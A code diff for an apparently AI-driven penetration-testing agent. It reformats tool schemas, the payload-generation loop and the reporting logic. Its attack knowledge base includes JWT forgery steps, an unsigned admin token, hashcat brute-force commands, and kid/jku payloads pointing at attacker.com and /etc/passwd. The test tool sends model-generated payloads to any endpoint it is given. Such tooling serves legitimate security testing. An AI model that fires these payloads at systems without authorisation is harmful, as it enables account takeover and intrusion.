 - Subtle: resource, view, template, load, src, url
 - Hidden: Any parameter used in file operations
-    `
+    `,
   },
 
   jwt_vulnerabilities: {
     name: "JWT (JSON Web Token) Vulnerabilities",
-    description: "Exploits weak JWT implementations allowing token forgery, signature bypass, or algorithm confusion",
-    objective: "Forge tokens, bypass authentication, escalate privileges, manipulate user identity",
+    description:
+      "Exploits weak JWT implementations allowing token forgery, signature bypass, or algorithm confusion",
+    objective:
+      "Forge tokens, bypass authentication, escalate privileges, manipulate user identity",
 
     jwtStructure: "header.payload.signature (all base64url encoded)",
 
@@ -887,7 +987,7 @@ CRITICAL: Test ALL parameters that might handle files:
       "Cookie: auth=<token>",
       "Cookie: session=<token>",
       "X-Auth-Token: <token>",
-      "X-Access-Token: <token>"
+      "X-Access-Token: <token>",
     ],
 
     techniques: [
@@ -897,12 +997,13 @@ CRITICAL: Test ALL parameters that might handle files:
         context: "Some implementations accept unsigned tokens",
         steps: [
           "1. Decode JWT: echo '<token>' | base64 -d",
-          "2. Change header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
+          '2. Change header: {"alg":"none","typ":"JWT"}',
           "3. Modify payload: change user_id, role, etc.",
           "4. Encode header + payload, remove signature",
-          "5. Send: header.payload. (note trailing dot)"
+          "5. Send: header.payload. (note trailing dot)",
         ],
-        example: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ."
+        example:
+          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.",
       },
       {
         name: "Algorithm Confusion (RS256→HS256)",
@@ -912,9 +1013,9 @@ CRITICAL: Test ALL parameters that might handle files:
           "1. Get public key from /jwks.json or /.well-known/jwks.json",
           "2. Change alg from RS256 to HS256 in header",
           "3. Sign token using public key as HMAC secret",
-          "4. Server verifies with same public key (HMAC instead of RSA)"
+          "4. Server verifies with same public key (HMAC instead of RSA)",
         ],
-        example: "Public key used as HMAC secret instead of RSA verification"
+        example: "Public key used as HMAC secret instead of RSA verification",
       },
       {
         name: "Weak Secret Brute Force",
@@ -923,13 +1024,18 @@ CRITICAL: Test ALL parameters that might handle files:
         tools: [
           "jwt_tool: jwt_tool <token> -C -d /path/to/wordlist",
           "hashcat: hashcat -m 16500 jwt.txt wordlist.txt",
-          "john: john --wordlist=wordlist.txt jwt.txt"
+          "john: john --wordlist=wordlist.txt jwt.txt",
         ],
         commonSecrets: [
-          "secret", "password", "123456", "qwerty",
-          "key", "jwt_secret", "your-256-bit-secret"
+          "secret",
+          "password",
+          "123456",
+          "qwerty",
+          "key",
+          "jwt_secret",
+          "your-256-bit-secret",
         ],
-        example: "If secret is 'secret', token can be forged"
+        example: "If secret is 'secret', token can be forged",
       },
       {
         name: "Payload Manipulation Without Re-signing",
@@ -941,33 +1047,35 @@ CRITICAL: Test ALL parameters that might handle files:
           "3. Change role: user → admin",
           "4. Re-encode payload",
           "5. Keep original signature",
-          "6. Send modified token"
+          "6. Send modified token",
         ],
-        example: "Change user_id without re-signing to access other user's data"
+        example:
+          "Change user_id without re-signing to access other user's data",
       },
       {
         name: "JWT Injection in Kid Parameter",
         how: "Inject malicious values in 'kid' (key ID) header",
         context: "When kid used to fetch signing key from filesystem or URL",
         payloads: [
-          "{\"kid\": \"/etc/passwd\"}",
-          "{\"kid\": \"../../../../etc/passwd\"}",
-          "{\"kid\": \"http://attacker.com/malicious-key\"}",
-          "{\"kid\": \"/dev/null\"}"
+          '{"kid": "/etc/passwd"}',
+          '{"kid": "../../../../etc/passwd"}',
+          '{"kid": "http://attacker.com/malicious-key"}',
+          '{"kid": "/dev/null"}',
         ],
-        example: "kid: /dev/null causes verification with empty key"
+        example: "kid: /dev/null causes verification with empty key",
       },
       {
         name: "JWT Header Injection",
         how: "Add malicious parameters to JWT header",
         context: "When application processes custom header parameters",
         payloads: [
-          "{\"jku\": \"http://attacker.com/jwks.json\"}",
-          "{\"x5u\": \"http://attacker.com/cert.pem\"}",
-          "{\"x5c\": [\"attacker-cert\"]}"
+          '{"jku": "http://attacker.com/jwks.json"}',
+          '{"x5u": "http://attacker.com/cert.pem"}',
+          '{"x5c": ["attacker-cert"]}',
         ],
-        example: "jku points to attacker-controlled JWKS to provide signing key"
-      }
+        example:
+          "jku points to attacker-controlled JWKS to provide signing key",
+      },
     ],
 
     testingWorkflow: [
@@ -980,7 +1088,7 @@ CRITICAL: Test ALL parameters that might handle files:
       "7. TEST 4: Try common secrets with jwt_tool or hashcat",
       "8. TEST 5: Modify kid parameter in header (path traversal)",
       "9. TEST 6: Try jku/x5u header injection",
-      "10. For each test, send modified token and check if accepted"
+      "10. For each test, send modified token and check if accepted",
     ],
 
     tools: [
@@ -988,7 +1096,7 @@ CRITICAL: Test ALL parameters that might handle files:
       "jwt.io: Online JWT decoder/encoder",
       "hashcat: For brute forcing secrets - hashcat -m 16500",
       "Burp Suite: JWT Editor extension",
-      "Command: echo 'token' | cut -d. -f2 | base64 -d"
+      "Command: echo 'token' | cut -d. -f2 | base64 -d",
     ],
 
     indicators: {
@@ -1001,7 +1109,7 @@ CRITICAL: Test ALL parameters that might handle files:
         "User ID manipulation successful (user 1 → user 2)",
         "Role/privilege escalation via token modification (user → admin)",
         "Kid parameter accepts path traversal",
-        "jku/x5u header injection successful"
+        "jku/x5u header injection successful",
       ],
       notVulnerable: [
         "Signature verification enforced",
@@ -1011,8 +1119,8 @@ CRITICAL: Test ALL parameters that might handle files:
         "Token modifications rejected",
         "Proper library usage with verification",
         "Kid parameter validated/whitelisted",
-        "Header parameter injection blocked"
-      ]
+        "Header parameter injection blocked",
+      ],
     },
 
     adaptiveStrategy: `
@@ -1042,8 +1150,8 @@ CRITICAL: JWT tokens often in:
 - X-Auth-Token or X-Access-Token headers
 
 Check ALL locations where tokens might be stored/transmitted!
-    `
-  }
+    `,
+  },
 } as const;
 
 // Exported type definitions for tool overrides
@@ -1055,7 +1163,9 @@ export const ExecuteCommandInput = z.object({
     .describe("Timeout in milliseconds (default: 30000)"),
   toolCallDescription: z
     .string()
-    .describe("Concise description of this tool call").optional(),
+    .describe(
+      "A concise, human-readable description of what this tool call is doing (e.g., 'Scanning for open ports on target')"
+    ),
 });
 
 export type ExecuteCommandOpts = z.infer<typeof ExecuteCommandInput>;
@@ -1089,7 +1199,9 @@ export const HttpRequestInput = z.object({
   timeout: z.number().default(10000),
   toolCallDescription: z
     .string()
-    .describe("Concise description of this tool call").optional(),
+    .describe(
+      "A concise, human-readable description of what this tool call is doing (e.g., 'Testing SQL injection on login endpoint')"
+    ),
 });
 
 export type HttpRequestOpts = z.infer<typeof HttpRequestInput>;
@@ -1103,7 +1215,6 @@ export type HttpRequestResult = {
   url: string;
   redirected: boolean;
 };
-
 
 /**
  * Analysis tool - Document findings and maintain testing state
@@ -1142,7 +1253,9 @@ FINDING STRUCTURE:
         .describe("CVE, CWE, or related references"),
       toolCallDescription: z
         .string()
-        .describe("Concise description of this tool call").optional(),
+        .describe(
+          "A concise, human-readable description of what this tool call is doing (e.g., 'Documenting SQL injection finding')"
+        ),
     }),
     execute: async (finding) => {
       try {
@@ -1252,7 +1365,9 @@ The scratchpad is session-specific and helps maintain context during long assess
         .default("general"),
       toolCallDescription: z
         .string()
-        .describe("Concise description of this tool call").optional(),
+        .describe(
+          "A concise, human-readable description of what this tool call is doing (e.g., 'Recording interesting endpoint behavior')"
+        ),
     }),
     execute: async ({ note, category }) => {
       try {
@@ -1314,6 +1429,11 @@ Provides guidance on:
     ]),
     results: z.string().describe("The scan results to analyze"),
     target: z.string().describe("The target that was scanned"),
+    toolCallDescription: z
+      .string()
+      .describe(
+        "A concise, human-readable description of what this tool call is doing (e.g., 'Analyzing port scan results')"
+      ),
   }),
   execute: async ({ scanType, results, target }) => {
     // Parse and provide intelligent analysis
@@ -1404,10 +1524,9 @@ The report will be saved as 'pentest-report.md' in the session root directory.`,
         .string()
         .optional()
         .describe("Additional details about the scope and limitations"),
-      keyFindings:
-        z.preprocess((val) => Array.isArray(val) ? val : [val],
-        z.array(z.string())
-          .describe("List of the most critical findings"),
+      keyFindings: z.preprocess(
+        (val) => (Array.isArray(val) ? val : [val]),
+        z.array(z.string()).describe("List of the most critical findings")
       ),
       recommendations: z
         .string()
@@ -1418,7 +1537,9 @@ The report will be saved as 'pentest-report.md' in the session root directory.`,
         .describe("Summary of testing activities performed"),
       toolCallDescription: z
         .string()
-        .describe("Concise description of this tool call").optional(),
+        .describe(
+          "A concise, human-readable description of what this tool call is doing (e.g., 'Generating final pentest report')"
+        ),
     }),
     execute: async ({
       executiveSummary,
@@ -1498,24 +1619,36 @@ The report will be saved as 'pentest-report.md' in the session root directory.`,
 
         // Read test results if they exist
         let testResultsSummary = "";
-        const testResultsFile = join(session.scratchpadPath, "test-results.jsonl");
+        const testResultsFile = join(
+          session.scratchpadPath,
+          "test-results.jsonl"
+        );
         if (existsSync(testResultsFile)) {
-          const testLines = readFileSync(testResultsFile, "utf-8").split("\n").filter(l => l.trim());
-          const testResults = testLines.map(line => {
-            try {
-              return JSON.parse(line);
-            } catch {
-              return null;
-            }
-          }).filter(Boolean);
+          const testLines = readFileSync(testResultsFile, "utf-8")
+            .split("\n")
+            .filter((l) => l.trim());
+          const testResults = testLines
+            .map((line) => {
+              try {
+                return JSON.parse(line);
+              } catch {
+                return null;
+              }
+            })
+            .filter(Boolean);
 
           const totalTests = testResults.length;
-          const vulnerableTests = testResults.filter(t => t.vulnerable).length;
+          const vulnerableTests = testResults.filter(
+            (t) => t.vulnerable
+          ).length;
           const notVulnerableTests = totalTests - vulnerableTests;
 
           // Group by attack type
-          const byAttackType: Record<string, { total: number; vulnerable: number }> = {};
-          testResults.forEach(test => {
+          const byAttackType: Record<
+            string,
+            { total: number; vulnerable: number }
+          > = {};
+          testResults.forEach((test) => {
             if (!byAttackType[test.attackType]) {
               byAttackType[test.attackType] = { total: 0, vulnerable: 0 };
             }
@@ -1530,9 +1663,14 @@ The report will be saved as 'pentest-report.md' in the session root directory.`,
 - **Parameters Tested (Not Vulnerable):** ${notVulnerableTests}
 
 **Attack Type Coverage:**
-${Object.entries(byAttackType).map(([type, stats]) =>
-  `- ${type}: ${stats.total} test${stats.total > 1 ? 's' : ''} (${stats.vulnerable} vulnerable)`
-).join('\n')}
+${Object.entries(byAttackType)
+  .map(
+    ([type, stats]) =>
+      `- ${type}: ${stats.total} test${stats.total > 1 ? "s" : ""} (${
+        stats.vulnerable
+      } vulnerable)`
+  )
+  .join("\n")}
 
 This demonstrates systematic testing methodology and proves thoroughness beyond just vulnerability discovery.`;
         }
@@ -1753,21 +1891,30 @@ This report should be treated as confidential and distributed only to authorized
 }
 
 /**
- * Core logic for recording test results 
+ * Core logic for recording test results
  */
-async function recordTestResultCore(session: Session.SessionInfo, params: {
-  parameter: string;
-  endpoint: string;
-  attackType: string;
-  vulnerable: boolean;
-  payloadsTested: Array<{payload: string; description: string; result: string}>;
-  conclusion: string;
-  evidence?: string;
-  confidence?: 'high' | 'medium' | 'low';
-}) {
+async function recordTestResultCore(
+  session: Session.SessionInfo,
+  params: {
+    parameter: string;
+    endpoint: string;
+    attackType: string;
+    vulnerable: boolean;
+    payloadsTested: Array<{
+      payload: string;
+      description: string;
+      result: string;
+    }>;
+    conclusion: string;
+    evidence?: string;
+    confidence?: "high" | "medium" | "low";
+  }
+) {
   try {
     const timestamp = new Date().toISOString();
-    const testId = `test-${Date.now()}-${params.attackType}-${params.parameter}`;
+    const testId = `test-${Date.now()}-${params.attackType}-${
+      params.parameter
+    }`;
 
     const testResult = {
       id: testId,
@@ -1780,13 +1927,13 @@ async function recordTestResultCore(session: Session.SessionInfo, params: {
       payloadsTested: params.payloadsTested,
       totalPayloadsTested: params.payloadsTested.length,
       conclusion: params.conclusion,
-      evidence: params.evidence || '',
-      confidence: params.confidence || 'high',
+      evidence: params.evidence || "",
+      confidence: params.confidence || "high",
     };
 
     // Save to scratchpad as test-results-{type}.json
-    const testResultsPath = join(session.scratchpadPath, 'test-results.jsonl');
-    const resultLine = JSON.stringify(testResult) + '\n';
+    const testResultsPath = join(session.scratchpadPath, "test-results.jsonl");
+    const resultLine = JSON.stringify(testResult) + "\n";
 
     appendFileSync(testResultsPath, resultLine);
 
@@ -1797,8 +1944,8 @@ async function recordTestResultCore(session: Session.SessionInfo, params: {
         ? `✓ Test recorded: VULNERABLE to ${params.attackType} (${params.payloadsTested.length} payloads tested)`
         : `✓ Test recorded: NOT vulnerable to ${params.attackType} (${params.payloadsTested.length} payloads tested)`,
       recommendation: params.vulnerable
-        ? 'Use document_finding to create a formal vulnerability report'
-        : 'Continue testing other attack types or parameters',
+        ? "Use document_finding to create a formal vulnerability report"
+        : "Continue testing other attack types or parameters",
     };
   } catch (error: any) {
     return {
@@ -1837,40 +1984,58 @@ Example workflow:
 4. Result: You've proven the parameter is safe from SQL injection`,
     inputSchema: z.object({
       parameter: z.string().describe("The parameter name that was tested"),
-      endpoint: z.string().describe("The endpoint/URL where the parameter exists"),
-      attackType: z.enum([
-        'sql_injection',
-        'nosql_injection',
-        'graphql_injection',
-        'xss_reflected',
-        'xss_stored',
-        'xss_dom',
-        'command_injection',
-        'xxe',
-        'ssrf',
-        'idor',
-        'csrf',
-        'lfi',
-        'rfi',
-        'ssti',
-        'path_traversal',
-        'authentication_bypass',
-        'authorization_bypass',
-        'business_logic',
-        'information_disclosure',
-        'rate_limiting',
-        'session_management',
-      ]).describe("The type of attack tested"),
+      endpoint: z
+        .string()
+        .describe("The endpoint/URL where the parameter exists"),
+      attackType: z
+        .enum([
+          "sql_injection",
+          "nosql_injection",
+          "graphql_injection",
+          "xss_reflected",
+          "xss_stored",
+          "xss_dom",
+          "command_injection",
+          "xxe",
+          "ssrf",
+          "idor",
+          "csrf",
+          "lfi",
+          "rfi",
+          "ssti",
+          "path_traversal",
+          "authentication_bypass",
+          "authorization_bypass",
+          "business_logic",
+          "information_disclosure",
+          "rate_limiting",
+          "session_management",
+        ])
+        .describe("The type of attack tested"),
       vulnerable: z.boolean().describe("Whether a vulnerability was found"),
-      payloadsTested: z.array(z.object({
-        payload: z.string(),
-        description: z.string(),
-        result: z.string(),
-      })).describe("List of payloads tested and their results"),
+      payloadsTested: z
+        .array(
+          z.object({
+            payload: z.string(),
+            description: z.string(),
+            result: z.string(),
+          })
+        )
+        .describe("List of payloads tested and their results"),
       conclusion: z.string().describe("Overall conclusion of the test"),
-      evidence: z.string().optional().describe("Evidence if vulnerability found"),
-      confidence: z.enum(['high', 'medium', 'low']).optional().describe("Confidence level if vulnerable"),
-      toolCallDescription: z.string().optional(),
+      evidence: z
+        .string()
+        .optional()
+        .describe("Evidence if vulnerability found"),
+      confidence: z
+        .enum(["high", "medium", "low"])
+        .optional()
+        .describe("Confidence level if vulnerable"),
+      toolCallDescription: z
+        .string()
+        .describe(
+          "A concise, human-readable description of what this tool call is doing (e.g., 'Recording SQL injection test on login endpoint')"
+        ),
     }),
     execute: async (params) => recordTestResultCore(session, params),
   });
@@ -1884,13 +2049,17 @@ Example workflow:
 type OnTokenUsage = (inputTokens: number, outputTokens: number) => void;
 
 // Generate AI-powered test strategy
-async function generateTestStrategy(params: {
-  attackType: string;
-  knowledge: any;
-  parameter: string;
-  endpoint: string;
-  context?: any;
-}, model: AIModel, onTokenUsage?: OnTokenUsage) {
+async function generateTestStrategy(
+  params: {
+    attackType: string;
+    knowledge: any;
+    parameter: string;
+    endpoint: string;
+    context?: any;
+  },
+  model: AIModel,
+  onTokenUsage?: OnTokenUsage
+) {
   const prompt = `You are a penetration testing expert. Generate a concise testing strategy:
 
 Attack Type: ${params.knowledge.name}
@@ -1898,7 +2067,9 @@ Description: ${params.knowledge.description}
 Objective: ${params.knowledge.objective}
 
 Techniques available:
-${params.knowledge.techniques.map((t: any) => `- ${t.name}: ${t.how}`).join('\n')}
+${params.knowledge.techniques
+  .map((t: any) => `- ${t.name}: ${t.how}`)
+  .join("\n")}
 
 Target: ${params.endpoint} parameter "${params.parameter}"
 Context: ${JSON.stringify(params.context || {})}
@@ -1920,7 +2091,10 @@ Be tactical and specific.`;
 
     // Report token usage if callback provided
     if (onTokenUsage && result.usage) {
-      onTokenUsage(result.usage.inputTokens ?? 0, result.usage.outputTokens ?? 0);
+      onTokenUsage(
+        result.usage.inputTokens ?? 0,
+        result.usage.outputTokens ?? 0
+      );
     }
 
     return result.text;
@@ -1931,22 +2105,34 @@ Be tactical and specific.`;
 }
 
 // Generate contextual payload using AI
-async function generatePayload(params: {
-  attackType: string;
-  knowledge: any;
-  context: any;
-  previousResults: any[];
-  round: number;
-}, model: AIModel, onTokenUsage?: OnTokenUsage) {
+async function generatePayload(
+  params: {
+    attackType: string;
+    knowledge: any;
+    context: any;
+    previousResults: any[];
+    round: number;
+  },
+  model: AIModel,
+  onTokenUsage?: OnTokenUsage
+) {
   const prompt = `Generate ONE ${params.knowledge.name} payload for testing.
 
 Techniques:
-${params.knowledge.techniques.map((t: any) => `- ${t.name}: ${t.example}`).join('\n')}
+${params.knowledge.techniques
+  .map((t: any) => `- ${t.name}: ${t.example}`)
+  .join("\n")}
 
-${params.previousResults.length > 0 ? `
+${
+  params.previousResults.length > 0
+    ? `
 Previous attempts:
-${params.previousResults.map((r: any) => `- ${r.payload}: ${r.result} (vulnerable: ${r.vulnerable})`).join('\n')}
-` : ''}
+${params.previousResults
+  .map((r: any) => `- ${r.payload}: ${r.result} (vulnerable: ${r.vulnerable})`)
+  .join("\n")}
+`
+    : ""
+}
 
 Round ${params.round + 1}/3:
 - Round 1: Detection/reconnaissance
@@ -1966,38 +2152,49 @@ Generate ONE specific payload. Return ONLY JSON:
 
     return result;
   } catch (error) {
-    console.error('AI payload generation failed:', error);
+    console.error("AI payload generation failed:", error);
   }
 
   // Fallback: Use first technique example
-  const technique = params.knowledge.techniques[params.round % params.knowledge.techniques.length];
+  const technique =
+    params.knowledge.techniques[
+      params.round % params.knowledge.techniques.length
+    ];
   return {
     payload: technique.example.split("'")[1] || technique.example,
     reasoning: `Using ${technique.name} technique`,
-    technique: technique.name
+    technique: technique.name,
   };
 }
 
 // Analyze response with AI
-async function analyzeResponse(params: {
-  response: any;
-  payload: any;
-  attackType: string;
-  knowledge: any;
-  previousResults: any[];
-}, model: AIModel, onTokenUsage?: OnTokenUsage) {
+async function analyzeResponse(
+  params: {
+    response: any;
+    payload: any;
+    attackType: string;
+    knowledge: any;
+    previousResults: any[];
+  },
+  model: AIModel,
+  onTokenUsage?: OnTokenUsage
+) {
   const prompt = `Analyze this security test response:
 
 Attack: ${params.knowledge.name}
 Payload: ${params.payload.payload}
 HTTP Status: ${params.response.status}
-Response Body: ${params.response.body?.substring(0, 500) || 'N/A'}
+Response Body: ${params.response.body?.substring(0, 500) || "N/A"}
 
 Vulnerable indicators:
-${params.knowledge.indicators.vulnerable.map((i: string) => `- ${i}`).join('\n')}
+${params.knowledge.indicators.vulnerable
+  .map((i: string) => `- ${i}`)
+  .join("\n")}
 
 Secure indicators:
-${params.knowledge.indicators.notVulnerable.map((i: string) => `- ${i}`).join('\n')}
+${params.knowledge.indicators.notVulnerable
+  .map((i: string) => `- ${i}`)
+  .join("\n")}
 
 Analyze: Is this vulnerable? Return ONLY JSON:
 {
@@ -2018,7 +2215,7 @@ Analyze: Is this vulnerable? Return ONLY JSON:
 
     return result;
   } catch (error) {
-    console.error('AI analysis failed:', error);
+    console.error("AI analysis failed:", error);
   }
 
   // Fallback: Simple heuristic detection
@@ -2030,27 +2227,32 @@ Analyze: Is this vulnerable? Return ONLY JSON:
     responseStr.includes(indicator.toLowerCase().substring(0, 20))
   );
 
-  const foundSecureIndicator = notVulnerableIndicators.some((indicator: string) =>
-    responseStr.includes(indicator.toLowerCase().substring(0, 20))
+  const foundSecureIndicator = notVulnerableIndicators.some(
+    (indicator: string) =>
+      responseStr.includes(indicator.toLowerCase().substring(0, 20))
   );
 
   return {
     vulnerable: foundVulnIndicator && !foundSecureIndicator,
-    confidence: foundVulnIndicator ? 'medium' : 'low',
+    confidence: foundVulnIndicator ? "medium" : "low",
     reasoning: foundVulnIndicator
-      ? 'Response contains vulnerability indicators'
+      ? "Response contains vulnerability indicators"
       : foundSecureIndicator
-        ? 'Response shows secure implementation'
-        : 'Inconclusive - no clear indicators',
+      ? "Response shows secure implementation"
+      : "Inconclusive - no clear indicators",
     certainlyNotVulnerable: foundSecureIndicator,
-    suggestedNextTest: 'Try alternative payload or technique'
+    suggestedNextTest: "Try alternative payload or technique",
   };
 }
 
 /**
  * Smart Test Parameter Tool
  */
-function createSmartTestTool(session: Session.SessionInfo, model: AIModel, onTokenUsage?: OnTokenUsage) {
+function createSmartTestTool(
+  session: Session.SessionInfo,
+  model: AIModel,
+  onTokenUsage?: OnTokenUsage
+) {
   return tool({
     name: "test_parameter",
     description: `Intelligently test a parameter for a vulnerability using AI-powered adaptive testing.
@@ -2080,24 +2282,39 @@ test_parameter({
     inputSchema: z.object({
       parameter: z.string().describe("Parameter name to test"),
       endpoint: z.string().describe("Endpoint URL where parameter exists"),
-      attackType: z.enum([
-        'sql_injection', 'nosql_injection', 'graphql_injection',
-        'xss_reflected', 'xss_stored', 'command_injection',
-        'idor', 'business_logic'
-      ]).describe("Type of attack to test"),
-      context: z.object({
-        parameterType: z.string().optional(),
-        method: z.string().optional(),
-        techStack: z.string().optional(),
-        observations: z.string().optional()
-      }).optional().describe("Additional context about the target"),
-      toolCallDescription: z.string().optional()
+      attackType: z
+        .enum([
+          "sql_injection",
+          "nosql_injection",
+          "graphql_injection",
+          "xss_reflected",
+          "xss_stored",
+          "command_injection",
+          "idor",
+          "business_logic",
+        ])
+        .describe("Type of attack to test"),
+      context: z
+        .object({
+          parameterType: z.string().optional(),
+          method: z.string().optional(),
+          techStack: z.string().optional(),
+          observations: z.string().optional(),
+        })
+        .optional()
+        .describe("Additional context about the target"),
+      toolCallDescription: z
+        .string()
+        .describe(
+          "A concise, human-readable description of what this tool call is doing (e.g., 'Testing username parameter for SQL injection')"
+        ),
     }),
 
-    execute: async ({parameter, endpoint, attackType, context}) => {
+    execute: async ({ parameter, endpoint, attackType, context }) => {
       try {
         // Get attack knowledge
-        const knowledge = ATTACK_KNOWLEDGE[attackType as keyof typeof ATTACK_KNOWLEDGE];
+        const knowledge =
+          ATTACK_KNOWLEDGE[attackType as keyof typeof ATTACK_KNOWLEDGE];
         if (!knowledge) {
           return {
             success: false,
@@ -2105,7 +2322,7 @@ test_parameter({
           };
         }
 
-        if ('systematic_discovery' in knowledge) {
+        if ("systematic_discovery" in knowledge) {
           return {
             success: false,
             message: `methodology is not a testable attack type - use specific attack types like sql_injection, xss_reflected, etc.`,
@@ -2115,32 +2332,40 @@ test_parameter({
         console.log(`\n[*] Testing ${parameter} for ${knowledge.name}...`);
 
         // Generate strategy (optional, for logging)
-        const strategy = await generateTestStrategy({
-          attackType,
-          knowledge,
-          parameter,
-          endpoint,
-          context
-        }, model, onTokenUsage);
+        const strategy = await generateTestStrategy(
+          {
+            attackType,
+            knowledge,
+            parameter,
+            endpoint,
+            context,
+          },
+          model,
+          onTokenUsage
+        );
 
         console.log(`Strategy: ${strategy}`);
 
         // Adaptive testing loop (up to 3 rounds)
         const results = [];
         let vulnerable = false;
-        let finalConfidence = 'low';
+        let finalConfidence = "low";
 
         for (let round = 0; round < 3 && !vulnerable; round++) {
           console.log(`  Round ${round + 1}/3...`);
 
           // AI generates payload
-          const payloadData = await generatePayload({
-            attackType,
-            knowledge,
-            context: {...context, parameter, endpoint},
-            previousResults: results,
-            round
-          }, model, onTokenUsage);
+          const payloadData = await generatePayload(
+            {
+              attackType,
+              knowledge,
+              context: { ...context, parameter, endpoint },
+              previousResults: results,
+              round,
+            },
+            model,
+            onTokenUsage
+          );
 
           console.log(`  Payload: ${payloadData.payload}`);
           console.log(`  Reasoning: ${payloadData.reasoning}`);
@@ -2149,70 +2374,90 @@ test_parameter({
           let response;
           try {
             response = await fetch(endpoint, {
-              method: context?.method || 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({[parameter]: payloadData.payload})
+              method: context?.method || "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ [parameter]: payloadData.payload }),
             });
 
             const body = await response.text();
             response = {
               status: response.status,
               body: body.substring(0, 1000), // Limit for analysis
-              headers: Object.fromEntries(response.headers.entries())
+              headers: Object.fromEntries(response.headers.entries()),
             };
           } catch (error: any) {
             response = {
               status: 0,
               body: error.message,
-              headers: {}
+              headers: {},
             };
           }
 
           // AI analyzes response
-          const analysis = await analyzeResponse({
-            response,
-            payload: payloadData,
-            attackType,
-            knowledge,
-            previousResults: results
-          }, model, onTokenUsage);
+          const analysis = await analyzeResponse(
+            {
+              response,
+              payload: payloadData,
+              attackType,
+              knowledge,
+              previousResults: results,
+            },
+            model,
+            onTokenUsage
+          );
 
           console.log(`  Analysis: ${analysis.reasoning}`);
-          console.log(`  Vulnerable: ${analysis.vulnerable} (confidence: ${analysis.confidence})`);
+          console.log(
+            `  Vulnerable: ${analysis.vulnerable} (confidence: ${analysis.confidence})`
+          );
 
           results.push({
             payload: payloadData.payload,
             description: payloadData.reasoning,
             result: `HTTP ${response.status}: ${analysis.reasoning}`,
             vulnerable: analysis.vulnerable,
-            confidence: analysis.confidence
+            confidence: analysis.confidence,
           });
 
           vulnerable = analysis.vulnerable;
           finalConfidence = analysis.confidence;
 
           // Stop if high confidence or certainly not vulnerable
-          if ((vulnerable && analysis.confidence === 'high') || analysis.certainlyNotVulnerable) {
-            console.log(`  Stopping early: ${analysis.certainlyNotVulnerable ? 'Certainly not vulnerable' : 'High confidence vulnerability found'}`);
+          if (
+            (vulnerable && analysis.confidence === "high") ||
+            analysis.certainlyNotVulnerable
+          ) {
+            console.log(
+              `  Stopping early: ${
+                analysis.certainlyNotVulnerable
+                  ? "Certainly not vulnerable"
+                  : "High confidence vulnerability found"
+              }`
+            );
             break;
           }
         }
 
         // Record test result
         const recordTool = createRecordTestResultTool(session);
-        await recordTool.execute!({
-          parameter,
-          endpoint,
-          attackType,
-          vulnerable,
-          payloadsTested: results,
-          conclusion: vulnerable
-            ? `VULNERABLE to ${knowledge.name} with ${finalConfidence} confidence`
-            : `NOT VULNERABLE to ${knowledge.name} after ${results.length} tests`,
-          evidence: vulnerable ? JSON.stringify(results.filter(r => r.vulnerable)) : undefined,
-          confidence: finalConfidence as any,
-          toolCallDescription: 'Recording test result'
-        }, {} as any);
+        await recordTool.execute!(
+          {
+            parameter,
+            endpoint,
+            attackType,
+            vulnerable,
+            payloadsTested: results,
+            conclusion: vulnerable
+              ? `VULNERABLE to ${knowledge.name} with ${finalConfidence} confidence`
+              : `NOT VULNERABLE to ${knowledge.name} after ${results.length} tests`,
+            evidence: vulnerable
+              ? JSON.stringify(results.filter((r) => r.vulnerable))
+              : undefined,
+            confidence: finalConfidence as any,
+            toolCallDescription: "Recording automated test result",
+          },
+          {} as any
+        );
 
         return {
           success: true,
@@ -2223,17 +2468,16 @@ test_parameter({
           recommendation: vulnerable
             ? `✓ VULNERABILITY FOUND! Use document_finding to formally document this ${knowledge.name} vulnerability.`
             : `✓ Parameter appears secure against ${knowledge.name}. Continue testing other attack types or parameters.`,
-          nextAction: vulnerable ? 'document_finding' : 'continue_testing'
+          nextAction: vulnerable ? "document_finding" : "continue_testing",
         };
-
       } catch (error: any) {
         return {
           success: false,
           error: error.message,
-          message: `Test failed: ${error.message}`
+          message: `Test failed: ${error.message}`,
         };
       }
-    }
+    },
   });
 }
 
@@ -2244,6 +2488,11 @@ function getAttackSurfaceAgent() {
       "Get the attack surface of a target using the attack surface agent",
     inputSchema: z.object({
       target: z.string().describe("The target to get the attack surface of"),
+      toolCallDescription: z
+        .string()
+        .describe(
+          "A concise, human-readable description of what this tool call is doing (e.g., 'Discovering attack surface')"
+        ),
     }),
     execute: async ({ target }) => {},
   });
@@ -2267,33 +2516,46 @@ Use this when:
 - You're unsure if you've tested thoroughly enough`,
 
     inputSchema: z.object({
-      objective: z.string().optional().describe("The penetration testing objective to compare coverage against"),
-      toolCallDescription: z.string().optional()
+      objective: z
+        .string()
+        .optional()
+        .describe(
+          "The penetration testing objective to compare coverage against"
+        ),
+      toolCallDescription: z
+        .string()
+        .describe(
+          "A concise, human-readable description of what this tool call is doing (e.g., 'Checking test coverage status')"
+        ),
     }),
 
     execute: async ({ objective }) => {
       try {
-        const testResultsPath = join(session.scratchpadPath, 'test-results.jsonl');
+        const testResultsPath = join(
+          session.scratchpadPath,
+          "test-results.jsonl"
+        );
 
         if (!existsSync(testResultsPath)) {
           return {
             success: true,
             totalTests: 0,
             coverage: {},
-            message: "No test results recorded yet. Start testing with test_parameter tool.",
+            message:
+              "No test results recorded yet. Start testing with test_parameter tool.",
             suggestions: objective
               ? `Based on objective "${objective}", consider testing relevant parameters with test_parameter tool.`
-              : "Use test_parameter to test parameters for vulnerabilities."
+              : "Use test_parameter to test parameters for vulnerabilities.",
           };
         }
 
         // Read all test results
-        const fileContent = readFileSync(testResultsPath, 'utf-8');
+        const fileContent = readFileSync(testResultsPath, "utf-8");
         const testResults = fileContent
           .trim()
-          .split('\n')
-          .filter(line => line.trim())
-          .map(line => JSON.parse(line));
+          .split("\n")
+          .filter((line) => line.trim())
+          .map((line) => JSON.parse(line));
 
         // Analyze coverage
         const parametersTested = new Set<string>();
@@ -2302,12 +2564,15 @@ Use this when:
         const vulnerableTests = [];
         const safeTests = [];
 
-        const coverageByAttackType: Record<string, {
-          total: number;
-          vulnerable: number;
-          safe: number;
-          parameters: Set<string>;
-        }> = {};
+        const coverageByAttackType: Record<
+          string,
+          {
+            total: number;
